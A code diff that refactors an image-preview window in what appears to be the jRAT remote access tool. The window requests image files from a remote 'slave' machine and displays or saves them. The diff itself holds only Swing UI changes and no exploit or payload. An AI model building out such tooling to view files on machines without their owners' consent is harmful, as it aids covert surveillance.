@@ -1,8 +1,8 @@
 package jrat.module.fs.ui.previews;
 
 import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
-import jrat.controller.ui.frames.BaseFrame;
 import jrat.controller.ui.panels.PanelImage;
 import jrat.module.fs.packets.Packet62PreviewImage;
 
@@ -14,51 +14,25 @@ import javax.swing.border.EmptyBorder;
 import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.awt.event.WindowAdapter;
-import java.awt.event.WindowEvent;
+import java.awt.image.BufferedImage;
 import java.io.File;
 import java.io.IOException;
-import java.util.HashMap;
-import java.util.Map;
 
 
 @SuppressWarnings("serial")
-public class FramePreviewImage extends BaseFrame {
+public class FramePreviewImage extends FilePreview<BufferedImage> {
 
-	public static final Map<Slave, FramePreviewImage> INSTANCES = new HashMap<Slave, FramePreviewImage>();
-
-	private JPanel contentPane;
 	private String file;
 
-	private PanelImage panel_img;
+	private PanelImage imagePanel;
 	private JButton btnReloadImage;
 
-	public PanelImage getPanel() {
-		return panel_img;
-	}
-
-	public void setButtonEnabled(boolean b) {
-		btnReloadImage.setEnabled(b);
-	}
-
 	public FramePreviewImage(Slave slave, String f) {
-		super(slave);
-		setIconImage(Toolkit.getDefaultToolkit().getImage(FramePreviewImage.class.getResource("/icons/image.png")));
-		setTitle("Image FilePreview - " + f);
-		addWindowListener(new WindowAdapter() {
-			@Override
-			public void windowClosing(WindowEvent arg0) {
-				exit();
-			}
-		});
+		super(slave, "Image Preview - " + f, Resources.getIcon("image"));
 		this.file = f;
 		this.slave = slave;
-		INSTANCES.put(slave, this);
-		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
-		setBounds(100, 100, 562, 385);
-		contentPane = new JPanel();
-		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
-		setContentPane(contentPane);
+
+		setBorder(new EmptyBorder(5, 5, 5, 5));
 
 		JPanel panel = new JPanel();
 		panel.setBorder(BorderFactory.createLineBorder(Color.gray.brighter()));
@@ -81,7 +55,7 @@ public class FramePreviewImage extends BaseFrame {
 				File file = c.getSelectedFile();
 				if (file != null) {
 					try {
-						ImageIO.write(getPanel().getBufferedImage(), "png", file);
+						ImageIO.write(imagePanel.getBufferedImage(), "png", file);
 					} catch (IOException e) {
 						JOptionPane.showMessageDialog(null, "Error saving image: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
 						e.printStackTrace();
@@ -90,23 +64,26 @@ public class FramePreviewImage extends BaseFrame {
 			}
 		});
 		btnSave.setIcon(IconUtils.getIcon("save"));
-		GroupLayout gl_contentPane = new GroupLayout(contentPane);
+		GroupLayout gl_contentPane = new GroupLayout(this);
 		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(btnReloadImage).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSave).addGap(342)).addGroup(gl_contentPane.createSequentialGroup().addComponent(panel, GroupLayout.DEFAULT_SIZE, 532, Short.MAX_VALUE).addContainerGap()));
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup().addComponent(panel, GroupLayout.DEFAULT_SIZE, 291, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReloadImage).addComponent(btnSave)).addGap(10)));
 		panel.setLayout(new BorderLayout(0, 0));
 
-		panel_img = new PanelImage();
-		panel.add(panel_img, BorderLayout.CENTER);
-		contentPane.setLayout(gl_contentPane);
+		imagePanel = new PanelImage();
+		panel.add(imagePanel, BorderLayout.CENTER);
+		setLayout(gl_contentPane);
 
 		reload();
 	}
 
+	public void addData(BufferedImage image) {
+        imagePanel.image = image;
+        imagePanel.repaint();
+
+        btnReloadImage.setEnabled(true);
+    }
+
 	public void reload() {
 		slave.addToSendQueue(new Packet62PreviewImage(file));
-	}
-
-	public void exit() {
-		INSTANCES.remove(slave);
 	}
 }
